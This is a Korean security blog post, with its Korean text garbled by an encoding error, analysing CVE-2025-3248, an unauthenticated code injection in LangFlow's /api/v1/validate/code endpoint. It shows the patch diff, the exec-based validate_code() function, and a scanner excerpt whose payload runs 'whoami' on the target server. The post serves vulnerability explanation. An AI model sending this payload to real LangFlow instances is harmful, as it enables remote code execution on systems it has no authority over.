---
title: "[í•˜ë£¨í•œì¤„] CVE-2025-3248: LangFlow Code Injection Vulnerability"
author: mungsul
tags: [LangFlow, code injection, AI, AI Agent, CVE-2025-3248, mungsul]
categories: [1day1line]
date: 2025-04-13 11:00:00
cc: true
index_img: /img/1day1line.png
---
## URL

- https://github.com/xuemian168/CVE-2025-3248/

## Target

- LangFlow < 1.3.0 

## Explain

AI ì—ì´ì „íŠ¸ ë¹Œë“œ ë° ë°°í¬ ë„êµ¬ì¸ LangFlow ì—ì„œ Code Injection ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.

LLM ì´ ìƒì„±í•œ ì½”ë“œë¥¼ ê²€ì¦í•˜ëŠ” API ì¸ `/api/v1/validate/code` ì—ì„œ `exec` ë¥¼ í˜¸ì¶œí•˜ëŠ” í•¨ìˆ˜ì¸ `validate_code()` ë¥¼ ë‚´ë¶€ì ìœ¼ë¡œ í˜¸ì¶œí•©ë‹ˆë‹¤. 

í•´ë‹¹ API ë¥¼ ì•„ë¬´ë‚˜ í˜¸ì¶œí•  ìˆ˜ ìˆì—ˆê¸°ì— [1], í˜„ì¬ ì‚¬ìš©ìë§Œ ì´ìš© ê°€ëŠ¥í•˜ë„ë¡ íŒ¨ì¹˜ê°€ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤. [2]

```python
from fastapi import APIRouter, HTTPException
from loguru import logger
from langflow.api.v1.base import Code, CodeValidationResponse, PromptValidationResponse, ValidatePromptRequest
from langflow.base.prompts.api_utils import process_prompt_template
from langflow.utils.validate import validate_code
# build router
router = APIRouter(prefix="/validate", tags=["Validate"])

@router.post("/code", status_code=200)
-async def post_validate_code(code: Code) -> CodeValidationResponse: # [1]
+async def post_validate_code(code: Code, current_user: CurrentActiveUser) -> CodeValidationResponse: [2]
    try:
        errors = validate_code(code.code)
        return CodeValidationResponse(
            imports=errors.get("imports", {}),
            function=errors.get("function", {}),
        )
    except Exception as e:
        logger.opt(exception=True).debug("Error validating code")
        raise HTTPException(status_code=500, detail=str(e)) from e
        
```

`validate_code()` ëŠ” POST ë¡œ ì „ë‹¬ë°›ì€ `code` ì— import ë¬¸ê³¼ python í•¨ìˆ˜ ì„ ì–¸ë¬¸ì´ ìˆëŠ”ì§€ í™•ì¸ í•˜ì—¬ import ë¬¸ì´ ìˆëŠ” ê²½ìš° ì´ë¦„ì— í•´ë‹¹í•˜ëŠ” ëª¨ë“ˆì„ ë¡œë“œí•˜ê³  [3] , í•¨ìˆ˜ê°€ ì„ ì–¸ë˜ì—ˆì„ ê²½ìš° `exec` ë¥¼ í†µí•´ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. [4]

```python
def validate_code(code):
    # Initialize the errors dictionary
    errors = {"imports": {"errors": []}, "function": {"errors": []}}

    # Parse the code string into an abstract syntax tree (AST)
    try:
        tree = ast.parse(code)
    except Exception as e:  # noqa: BLE001
        if hasattr(logger, "opt"):
            logger.opt(exception=True).debug("Error parsing code")
        else:
            logger.debug("Error parsing code")
        errors["function"]["errors"].append(str(e))
        return errors

    # Add a dummy type_ignores field to the AST
    add_type_ignores()
    tree.type_ignores = []

    # Evaluate the import statements
    for node in tree.body:
        if isinstance(node, ast.Import):
            for alias in node.names:
                try:
                    importlib.import_module(alias.name) # [3]
                except ModuleNotFoundError as e:
                    errors["imports"]["errors"].append(str(e))

    # Evaluate the function definition
    for node in tree.body:
        if isinstance(node, ast.FunctionDef):
            code_obj = compile(ast.Module(body=[node], type_ignores=[]), "<string>", "exec")
            try:
                exec(code_obj) # [4]
            except Exception as e:  # noqa: BLE001
                logger.opt(exception=True).debug("Error executing function code")
                errors["function"]["errors"].append(str(e))
```

ê³µê°œëœ CVE-2025-3248 ìŠ¤ìºë„ˆ([link](https://github.com/xuemian168/CVE-2025-3248/))ì—ì„œëŠ” ìœ„ ê·œì¹™ì— ë§ê²Œ python í•¨ìˆ˜ë¥¼ ì„ ì–¸í•˜ë©° ì‹œìŠ¤í…œ ëª…ë ¹ì„ ì‹¤í–‰ì‹œí‚¤ëŠ” êµ¬ë¬¸ì„ ì‚½ì…í•œ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. [5]

```python
# ìŠ¤ìºë„ˆ ì½”ë“œ ì¼ë¶€ ë°œì·Œ
...
    def check_vulnerability(self):
        """Check if target is vulnerable to Langflow vulnerability"""
        try:
            validate_url = urljoin(self.url, '/api/v1/validate/code')

            payload = {
                "code": """
def test(cd=exec('raise Exception(__import__("subprocess").check_output("whoami", shell=True))')):
    pass
"""  # [5] 
            }
            
            print(f"{Fore.YELLOW}[*] Testing endpoint: {validate_url}")
            response = self.session.post(
                validate_url, 
                json=payload, 
                timeout=self.timeout
            )
  ...
```

ì—¬ë‹´ì´ì§€ë§Œ, í•´ë‹¹ íŒ¨ì¹˜ë¡œ Preauth ì·¨ì•½ì ê¹Œì§€ëŠ” ë§‰í˜”ë”ë¼ë„, python ì½”ë“œë¥¼ ì‹¤í–‰ì‹œí‚¤ëŠ” êµ¬ì¡°ëŠ” ì—¬ì „í•˜ê¸°ì— Account Takeover ë‚˜ ì„¸ì…˜ íƒˆì·¨ì™€ ê°™ì€ ë‹¤ë¥¸ ì·¨ì•½ì ì„ ì—°ê³„í•œë‹¤ë©´ ì·¨ì•½ì ì´ ì¬ë°œí˜„ ë  ìˆ˜ë„ ìˆê² ë‹¤ëŠ” ìƒê°ì„ í•˜ê²Œ ë˜ë„¤ìš”. ğŸ˜¥



## Reference

- https://github.com/xuemian168/CVE-2025-3248/

- https://github.com/langflow-ai/langflow

- https://github.com/langflow-ai/langflow/pull/6911/commits/dbae45f5717b9bf0f3096fce7399851aba27e658